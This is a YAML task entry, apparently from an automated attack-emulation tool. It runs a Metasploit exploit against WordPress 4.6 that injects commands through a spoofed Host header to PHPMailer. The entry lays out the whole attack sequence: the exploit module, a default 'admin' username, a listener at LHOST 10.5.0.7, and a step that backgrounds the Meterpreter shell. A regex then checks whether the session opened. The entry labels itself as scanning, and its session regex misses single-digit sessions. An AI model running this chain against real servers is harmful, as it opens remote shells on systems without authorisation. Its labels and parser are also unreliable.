---

- id: 4
  name: MSF WP PHP Mailer Host Header
  description: |
    This module exploits a command injection vulnerability in WordPress version 4.6 with Exim as an MTA via a spoofed
    Host header to PHPMailer, a mail-sending library that is bundled with WordPress. A valid WordPress username is
    required to exploit the vulnerability. Additionally, due to the altered Host header, exploitation is limited to
    the default virtual host, assuming the header isn't mangled in transit. If the target is running Apache 2.2.32 or
    2.4.24 and later, the server may have HttpProtocolOptions set to Strict, preventing a Host header containing parens
    from passing through, making exploitation unlikely.
  tactic: technical-information-gathering
  technique: conduct-active-scanning
  parser:
    #we only want to check if there is a meterpreter session open
    flag: (Meterpreter session)\s+(\d[0-9])\s+(?:opened)
    # capture the string in groups: we only want <session>
    # CAREFUL! it only get up to 99 sessions
    miners: (?:Meterpreter session)\s+(?P<session>\d[0-9])\s+(?:opened)
  timeout: 20
  payload: msf.py
  requires:
    port: 80
  commands:
    - "use exploits/unix/webapp/wp_phpmailer_host_header"
    # An advanced user should be crafting this exploit with a known username gotten from somewhere
    - "set USERNAME ${USERNAME:admin}"
    # Set the path in where the wordpress is installed
    # - "set TARGETURI #{URI}"
  options:
    - "set LHOST 10.5.0.7"
    - "set RHOSTS #{TARGET}"
    - "run"
    # put the meterpreter session to sleep on the background
    - "background"
